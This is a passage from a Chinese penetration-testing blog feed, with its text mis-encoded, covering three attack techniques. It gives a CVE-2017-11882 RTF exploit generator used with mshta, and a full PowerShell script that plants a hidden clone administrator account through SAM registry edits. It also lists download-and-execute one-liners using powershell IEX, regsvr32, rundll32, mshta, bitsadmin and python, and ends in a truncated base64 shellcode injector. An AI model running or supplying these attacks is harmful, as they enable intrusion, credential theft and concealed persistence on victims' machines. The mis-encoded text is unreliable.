ä»Šå¤©åœ¨twitterä¸Šçœ‹åˆ°æœ‰äººå…±äº«äº†ä¸€ä¸ªPOCï¼Œtwitteråœ°å€ï¼Œpocåœ°å€ï¼Œåæ¥åˆçœ‹åˆ°æœ‰äººå…±äº«äº†ä¸€ä¸ªé¡¹ç›®CVE-2017-11882ï¼Œç®€å•çœ‹äº†ä¸€ä¸‹è¿™ä¸ªé¡¹ç›®ï¼Œé€šè¿‡å¯¹rtfæ–‡ä»¶çš„ä¿®æ”¹æ¥å®ç°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ï¼Œä½†æ˜¯æœ‰ä¸ªç¼ºé™·å°±æ˜¯ï¼Œè¿™ä¸ªé¡¹ç›®ä½¿ç”¨çš„æ˜¯ä½¿ç”¨webdavçš„æ–¹å¼æ¥æ‰§è¡Œè¿œç¨‹æ–‡ä»¶çš„ï¼Œä½¿ç”¨èµ·æ¥å¯èƒ½å¹¶ä¸å®¹æ˜“ï¼Œæ‰€ä»¥å°±å¯¹æ­¤æ–‡ä»¶è¿›è¡Œäº†ç®€å•çš„ä¿®æ”¹ï¼Œå…·ä½“é¡¹ç›®åœ°å€å¦‚ä¸‹ï¼šGITï¼šCVE-2017-11882 ã€‚ä½¿ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œå¦‚æœè¦æ‰§è¡Œå‘½ä»¤1python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc demo å…³äºæ€ä¹ˆè¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå¯ä»¥å‚è€ƒä¹‹å‰å†™çš„ã€Šwindowså‘½ä»¤æ‰§è¡Œæ¼æ´ä¸ä¼šç©ï¼Ÿ çœ‹æˆ‘ï¼ã€‹ï¼Œç”±äºæœ‰é•¿åº¦çš„é™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨mshtaçš„æ–¹å¼æ¥æ‰§è¡Œã€‚æ„é€ çš„å‘½ä»¤å¦‚ä¸‹ï¼š1python Command_CVE-2017-11882.py -c "mshta http://site.com/abc" -o test.doc æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š è§£å†³æ–¹æ¡ˆï¼š 1ã€å¾®è½¯å·²ç»å¯¹æ­¤æ¼æ´åšå‡ºäº†ä¿®å¤ã€‚123(1)ä¸‹è½½https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882 æ›´æ–°è¡¥ä¸è¿›è¡Œä¿®è¡¥(2)å¼€å¯Windows UpdateåŠŸèƒ½ï¼Œå®šæœŸå¯¹ç³»ç»Ÿè¿›è¡Œè‡ªåŠ¨æ›´æ–° 2ã€ç”±äºè¯¥å…¬å¼ç¼–è¾‘å™¨å·²ç»17å¹´æœªåšæ›´æ–°ï¼Œå¯èƒ½å­˜åœ¨å¤§é‡å®‰å…¨æ¼æ´ï¼Œå»ºè®®åœ¨æ³¨å†Œè¡¨ä¸­å–æ¶ˆè¯¥æ¨¡å—çš„æ³¨å†Œã€‚ æŒ‰ä¸‹Win+Rç»„åˆé”®ï¼Œæ‰“å¼€cmd.exe å¯¹åº”officeç‰ˆæœ¬ä¿®æ”¹ä»¥ä¸‹æ³¨å†Œè¡¨è·¯å¾„ä»¥åï¼Œè¾“å…¥ï¼š123reg add "HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;" /v "Compatibility Flags" /t REG_DWORD /d 0x400reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;" /v "Compatibility Flags" /t REG_DWORD /d 0x400]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ èƒ½æ‰¾åˆ°æˆ‘ä¹ˆï¼Ÿ-- éšè—ç”¨æˆ·å»ºç«‹ï¼ˆPowershellï¼‰]]></title>
    <url>%2Farchives%2FUserClone.html</url>
    <content type="text"><![CDATA[æœ€è¿‘åšæµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œwindows server2012 ä½¿ç”¨Mimikatzæ˜¯ç›´æ¥æŠ“ä¸åˆ°æ˜æ–‡å¯†ç çš„ï¼Œè€Œä¸”ï¼Œç›´æ¥åˆ›å»ºçš„è´¦å·ç™»é™†æœ‰æ—¶ä¼šç¢°åˆ°è¿™ä¸ªé—®é¢˜ï¼š psï¼š2012æŠ“æ˜æ–‡éœ€è¦HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigestçš„â€UseLogonCredentialâ€è®¾ç½®ä¸º1ï¼Œç±»å‹ä¸ºDWORD 32æ‰å¯ä»¥ï¼Œç„¶åä¸‹æ¬¡ç”¨æˆ·å†ç™»å½•ï¼Œæ‰èƒ½è®°å½•åˆ°æ˜æ–‡å¯†ç ã€‚ åæ¥å‘ç°ä»¥å‰çš„å»ºç«‹å…‹éš†è´¦å·çš„æ–¹å¼æ˜¯å¯ä»¥ä½¿å¾—æ–°å»ºçš„è´¦å·ç™»é™†ç³»ç»Ÿçš„ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæ•´ç†äº†ä¸€ä¸ªpowershellè„šæœ¬ï¼Œè„šæœ¬å¯ä»¥è‡ªåŠ¨ä¿®æ”¹æ³¨å†Œè¡¨é”®å€¼æƒé™ï¼ˆéœ€è¦ç”¨administratoræƒé™è¿è¡Œï¼Œå³bypassuacä»¥åçš„æƒé™ï¼‰ï¼Œä¹‹ååœ¨è¿›è¡Œæ“ä½œã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147function Create-Clone&#123;&lt;#.SYNOPSISThis script requires Administrator privileges. use Invoke-TokenManipulation.ps1 to get system privileges and create the clone user..PARAMETER uThe clone username.PARAMETER pThe clone user's password.PARAMETER cuThe user to clone, default administrator .EXAMPLECreate-Clone -u evi1cg -p evi1cg123 -cu administrator#&gt; Param( [Parameter(Mandatory=$true)] [String] $u, [Parameter(Mandatory=$true)] [String] $p, [Parameter(Mandatory=$false)] [String] $cu = "administrator" ) function upReg&#123; "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM [1 17]"| Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]" | Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] "| Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] "| Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]"| Out-File -Append $env:temp\up.ini cmd /c "regini $env:temp\up.ini" Remove-Item $env:temp\up.ini &#125; function downreg &#123; "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM [17]"| Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]" | Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] "| Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] "| Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]"| Out-File -Append $env:temp\down.ini cmd /c "regini $env:temp\down.ini" Remove-Item $env:temp\down.ini &#125; function Create-user ([string]$Username,[string]$Password) &#123; $group = "Administrators" $existing = Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$Username" if (!$existing) &#123; Write-Host "[*] Creating new local user $Username with password $Password" &amp; NET USER $Username $Password /add /y /expires:never | Out-Null Write-Host "[*] Adding local user $Username to $group." &amp; NET LOCALGROUP $group $Username /add | Out-Null &#125; else &#123; Write-Host "[*] Adding existing user $Username to $group." &amp; NET LOCALGROUP $group $Username /add | Out-Null $adsi = [ADSI]"WinNT://$env:COMPUTERNAME" $exist = $adsi.Children | where &#123;$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username &#125; Write-Host "[*] Setting password for existing local user $Username" $exist.SetPassword($Password) &#125; Write-Host "[*] Ensuring password for $Username never expires." &amp; WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE | Out-Null &#125; function GetUser-Key([string]$user) &#123; cmd /c " echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user [1 17] &gt;&gt; $env:temp\$user.ini" cmd /c "regini $env:temp\$user.ini" Remove-Item $env:temp\$user.ini if(Test-Path -Path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$user")&#123; cmd /c "regedit /e $env:temp\$user.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user"" $file = Get-Content "$env:temp\$user.reg" | Out-String $pattern="@=hex\((.*?)\)\:" $file -match $pattern |Out-Null $key = "00000"+$matches[1] Write-Host "[!]"$key return $key &#125;else &#123; Write-Host "[-] SomeThing Wrong !" &#125; &#125; function Clone ([string]$ukey,[string]$cukey) &#123; "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$ukey [1 17] "| Out-File $env:temp\f.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$cukey [1 17] " | Out-File $env:temp\f.ini cmd /c " regini $env:temp\f.ini" Remove-Item $env:temp\f.ini $ureg = "HKLM:\SAM\SAM\Domains\Account\Users\$ukey" |Out-String $cureg = "HKLM:\SAM\SAM\Domains\Account\Users\$cukey" |Out-String Write-Host "[*] Get clone user'F value" $cuFreg = Get-Item -Path $cureg.Trim() $cuFvalue = $cuFreg.GetValue('F') Write-Host "[*] Change user'F value" Set-ItemProperty -path $ureg.Trim() -Name "F" -value $cuFvalue $outreg = "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$ukey" cmd /c "regedit /e $env:temp\out.reg $outreg.Trim()" &#125; function Main () &#123; if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) &#123; Write-Output "Script must be run as administrator" break &#125; Write-Output "[*] Start" Write-Output "[*] Tring to change reg privilege !" upReg if( !(Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$cu"))&#123; Write-Host "[-] The User to Clone does not exist !" Write-Output "[*] Change reg privilege back !" downReg Write-Output "[*] Exiting !" &#125; else &#123; if(!(Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$u"))&#123; $tmp = "1" &#125; else&#123; $tmp = "0" &#125; Write-Output "[*] Create User..." Create-user $u $p Write-Output "[*] Get User $u's Key .." $ukey = GetUser-Key $u |Out-String Write-Output "[*] Get User $cu's Key .." $cukey = GetUser-Key $cu |Out-String Write-Output "[*] Clone User.." Clone $ukey $cukey if($tmp -eq 1 )&#123; Write-Output "[*] Delete User.." cmd /c "net User $u /del " |Out-Null &#125;else&#123; Write-Output "[*] Don't need to delete.."&#125; cmd /c "regedit /s $env:temp\$u.reg" cmd /c "regedit /s $env:temp\out.reg" Remove-Item $env:temp\*.reg Write-Output "[*] Change reg privilege back !" downreg Write-Output "[*] Done" &#125; &#125; Main&#125; GIT : Pentest æ–°å»ºè´¦å·ä»¥åï¼Œå¯æˆåŠŸç™»é™†ç³»ç»Ÿ åœ¨Win7ä¸Šåšçš„æµ‹è¯•å¦‚ä¸‹ï¼š demo å½“ç„¶å¯ä»¥é…åˆè¿™ä¸ªå§¿åŠ¿æ¥å®ç°å¤šç”¨æˆ·ç™»é™†ã€‚ ä½¿ç”¨mimikatz.exe,æ‰§è¡Œts::multirdpå…è®¸å¤šç”¨æˆ·è¿œç¨‹ç™»å½• ps:è¯¥æ–¹æ³•åœ¨ç³»ç»Ÿé‡å¯åå¤±æ•ˆï¼Œä¸‹æ¬¡ä½¿ç”¨éœ€è¦é‡æ–°æ‰§è¡Œå‘½ä»¤ts::multirdp,ä¹Ÿå¯é€šè¿‡ä¿®æ”¹æ–‡ä»¶termsrv.dllå®ç°æ°¸ä¹…ä¿®æ”¹ æœ€åæ˜¯è¿œç¨‹æ‰§è¡Œçš„æ–¹å¼ï¼š1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u demo$ -p test123]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windowså‘½ä»¤æ‰§è¡Œæ¼æ´ä¸ä¼šç©ï¼Ÿ çœ‹æˆ‘ï¼]]></title>
    <url>%2Farchives%2Fremote_exec.html</url>
    <content type="text"><![CDATA[ç»å¸¸æœ‰å°ä¼™ä¼´ç¢°åˆ°äº†å‘½ä»¤æ‰§è¡Œæ¼æ´ä¸ä¼šç©ï¼Œæ¯”å¦‚mssqlæ³¨å…¥ç‚¹çš„å‘½ä»¤æ‰§è¡Œï¼Œæ€ä¹ˆæ¥è·å–ä¸€ä¸ªmeterpreterï¼Ÿè¿™ä¸ªæ—¶å€™ï¼Œå°±éœ€è¦æƒ³åŠæ³•æ¥è·å–äº†ï¼Œå…³äºå‘½ä»¤è¡Œæ¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤çš„æ–¹æ³•ç¢°åˆ°å¾ˆå¤šï¼Œä½†æ˜¯ç”¨çš„æ—¶å€™è€ä¼šè®°ä¸èµ·æ¥ï¼Œæ‰€ä»¥åœ¨è¿™é‡ŒæŠŠç¢°åˆ°çš„ä½œä¸ºä¸€ä¸ªæ€»ç»“ï¼Œæ²¡å‡†é‚£ç§æ–¹æ³•èƒ½å¸®åˆ°ä½ ã€‚ï¼ˆå½“ç„¶ï¼Œæˆ‘ä»¬è¿™é‡Œä¸è¯´å¯ä»¥ç›´æ¥echo webshellçš„æƒ…å½¢ï¼‰ 1ã€powershelleg:1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz 2ã€regsvr32eg:1regsvr32 /u /s /i:http://site.com/js.png scrobj.dll js.png123456789101112131415&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ ps = "cmd.exe /c calc.exe"; new ActiveXObject("WScript.Shell").Run(ps,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 3ã€rundll32eg:1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125;% ç»†èŠ‚ï¼šçœ‹æˆ‘ 4ã€mshtaeg:121ï¼‰ mshta http://site.com/calc.hta2ï¼‰ mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")")) calc.hta123456789101112131415&lt;HTML&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;&lt;HEAD&gt; &lt;script language="VBScript"&gt;Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject("Wscript.Shell")objShell.Run "calc.exe"self.close&lt;/script&gt;&lt;body&gt;demo&lt;/body&gt;&lt;/HEAD&gt; &lt;/HTML&gt; 5ã€pubprn.vbseg:1cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct 6ã€bitsadmineg:1cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe 7ã€pythonï¼ˆéœ€å®‰è£…ï¼‰eg:1python -c "import urllib2; exec urllib2.urlopen('http://site.com/abc').read();" abc1import base64; exec base64.b64decode("aW1wb3J0IGN0eXBlcwppbXBvcnQgcGxhdGZvcm0KCihhcmNoLCB0eXBlKSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpCgojIDMyLWJpdCBQeXRob24KaWYgYXJjaCA9PSAiMzJiaXQiOgoJc2hlbGxjb2RlID0gIlx4ZmNceGU4XHg4OVx4MDBceDAwXHgwMFx4NjBceDg5XHhlNVx4MzFceGQyXHg2NFx4OGJceDUyXHgzMFx4OGJceDUyXHgwY1x4OGJceDUyXHgxNFx4OGJceDcyXHgyOFx4MGZceGI3XHg0YVx4MjZceDMxXHhmZlx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4MDFceGM3XHhlMlx4ZjBceDUyXHg1N1x4OGJceDUyXHgxMFx4OGJceDQyXHgzY1x4MDFceGQwXHg4Ylx4NDBceDc4XHg4NVx4YzBceDc0XHg0YVx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4OGJceDU4XHgyMFx4MDFceGQzXHhlM1x4M2NceDQ5XHg4Ylx4MzRceDhiXHgwMVx4ZDZceDMxXHhmZlx4MzFceGMwXHhhY1x4YzFceGNmXHgwZFx4MDFceGM3XHgzOFx4ZTBceDc1XHhmNFx4MDNceDdkXHhmOFx4M2JceDdkXHgyNFx4NzVceGUyXHg1OFx4OGJceDU4XHgyNFx4MDFceGQzXHg2Nlx4OGJceDBjXHg0Ylx4OGJceDU4XHgxY1x4MDFceGQzXHg4Ylx4MDRceDhiXHgwMVx4ZDBceDg5XHg0NFx4MjRceDI0XHg1Ylx4NWJceDYxXHg1OVx4NWFceDUxXHhmZlx4ZTBceDU4XHg1Zlx4NWFceDhiXHgxMlx4ZWJceDg2XHg1ZFx4NjhceDZlXHg2NVx4NzRceDAwXHg2OFx4NzdceDY5XHg2ZVx4NjlceDU0XHg2OFx4NGNceDc3XHgyNlx4MDdceGZmXHhkNVx4ZThceDgwXHgwMFx4MDBceDAwXHg0ZFx4NmZceDdhXHg2OVx4NmNceDZjXHg2MVx4MmZceDM1XHgyZVx4MzBceDIwXHgyOFx4NjNceDZmXHg2ZFx4NzBceDYxXHg3NFx4NjlceDYyXHg2Y1x4NjVceDNiXHgyMFx4NGRceDUzXHg0OVx4NDVceDIwXHgzOVx4MmVceDMwXHgzYlx4MjBceDU3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFx4NGVceDU0XHgyMFx4MzZceDJlXHgzMVx4M2JceDIwXHg1N1x4NGZceDU3XHgzNlx4MzRceDNiXHgyMFx4NTRceDcyXHg2OVx4NjRceDY1XHg2ZVx4NzRceDJmXHgzNVx4MmVceDMwXHgzYlx4MjBceDQyXHg0Zlx4NDlceDQ1XHgzOVx4M2JceDQ1XHg0ZVx4NTVceDUzXHg0ZFx4NTNceDQ1XHgyOVx4MDBceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4MDBceDU5XHgzMVx4ZmZceDU3XHg1N1x4NTdceDU3XHg1MVx4NjhceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3OVx4NWJceDMxXHhjOVx4NTFceDUxXHg2YVx4MDNceDUxXHg1MVx4NjhceGI4XHgyMlx4MDBceDAwXHg1M1x4NTBceDY4XHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NjJceDU5XHgzMVx4ZDJceDUyXHg2OFx4MDBceDAyXHg2MFx4ODRceDUyXHg1Mlx4NTJceDUxXHg1Mlx4NTBceDY4XHhlYlx4NTVceDJlXHgzYlx4ZmZceGQ1XHg4OVx4YzZceDMxXHhmZlx4NTdceDU3XHg1N1x4NTdceDU2XHg2OFx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHg3NFx4NDRceDMxXHhmZlx4ODVceGY2XHg3NFx4MDRceDg5XHhmOVx4ZWJceDA5XHg2OFx4YWFceGM1XHhlMlx4NWRceGZmXHhkNVx4ODlceGMxXHg2OFx4NDVceDIxXHg1ZVx4MzFceGZmXHhkNVx4MzFceGZmXHg1N1x4NmFceDA3XHg1MVx4NTZceDUwXHg2OFx4YjdceDU3XHhlMFx4MGJceGZmXHhkNVx4YmZceDAwXHgyZlx4MDBceDAwXHgzOVx4YzdceDc0XHhiY1x4MzFceGZmXHhlYlx4MTVceGViXHg0OVx4ZThceDk5XHhmZlx4ZmZceGZmXHgyZlx4NTJceDYyXHg0Nlx4NjJceDAwXHgwMFx4NjhceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDZhXHg0MFx4NjhceDAwXHgxMFx4MDBceDAwXHg2OFx4MDBceDAwXHg0MFx4MDBceDU3XHg2OFx4NThceGE0XHg1M1x4ZTVceGZmXHhkNVx4OTNceDUzXHg1M1x4ODlceGU3XHg1N1x4NjhceDAwXHgyMFx4MDBceDAwXHg1M1x4NTZceDY4XHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg4NVx4YzBceDc0XHhjZFx4OGJceDA3XHgwMVx4YzNceDg1XHhjMFx4NzVceGU1XHg1OFx4YzNceGU4XHgzN1x4ZmZceGZmXHhmZlx4MzFceDMwXHgzM1x4MmVceDMyXHgzM1x4MzhceDJlXHgzMlx4MzJceDM1XHgyZVx4MzFceDMyXHgzOVx4MDAiCgojIDY0LWJpdCBQeXRob24KZWxpZiBhcmNoID09ICI2NGJpdCI6CglzaGVsbGNvZGUgPSAiXHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceGU4XHg4MFx4MDBceDAwXHgwMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzlceDJlXHgzMFx4M2JceDIwXHg1N1x4NjlceDZlXHg2NFx4NmZceDc3XHg3M1x4MjBceDRlXHg1NFx4MjBceDM2XHgyZVx4MzFceDNiXHgyMFx4NTdceDRmXHg1N1x4MzZceDM0XHgzYlx4MjBceDU0XHg3Mlx4NjlceDY0XHg2NVx4NmVceDc0XHgyZlx4MzVceDJlXHgzMFx4M2JceDIwXHg0Mlx4NGZceDQ5XHg0NVx4MzlceDNiXHg0NVx4NGVceDU1XHg1M1x4NGRceDUzXHg0NVx4MjlceDAwXHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDAwXHg1OVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NDFceDUwXHg0MVx4NTBceDQxXHhiYVx4M2FceDU2XHg3OVx4YTdceGZmXHhkNVx4ZWJceDYxXHg1YVx4NDhceDg5XHhjMVx4NDFceGI4XHhiOFx4MjJceDAwXHgwMFx4NGRceDMxXHhjOVx4NDFceDUxXHg0MVx4NTFceDZhXHgwM1x4NDFceDUxXHg0MVx4YmFceDU3XHg4OVx4OWZceGM2XHhmZlx4ZDVceGViXHg0NFx4NDhceDg5XHhjMVx4NDhceDMxXHhkMlx4NDFceDU4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NjBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NmFceDBhXHg1Zlx4NDhceDg5XHhmMVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NTJceDUyXHg0MVx4YmFceDJkXHgwNlx4MThceDdiXHhmZlx4ZDVceDg1XHhjMFx4NzVceDFkXHg0OFx4ZmZceGNmXHg3NFx4MTBceGViXHhkZlx4ZWJceDYzXHhlOFx4YjdceGZmXHhmZlx4ZmZceDJmXHg2Ylx4NTRceDQ4XHg1Nlx4MDBceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceGMzXHhlOFx4MzVceGZmXHhmZlx4ZmZceDMxXHgzMFx4MzNceDJlXHgzMlx4MzNceDM4XHgyZVx4MzJceDMyXHgzNVx4MmVceDMxXHgzMlx4MzlceDAwIiAKZWxzZToKCXNoZWxsY29kZSA9ICIiCgojIHNhbml0eSBjaGVjayBvdXIgc2l0dWF0aW9uCmlmIHR5cGUgIT0gIldpbmRvd3NQRSIgb3IgbGVuKHNoZWxsY29kZSkgPT0gMDoKCXF1aXQoKQoKIyBpbmplY3Qgb3VyIHNoZWxsY29kZQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5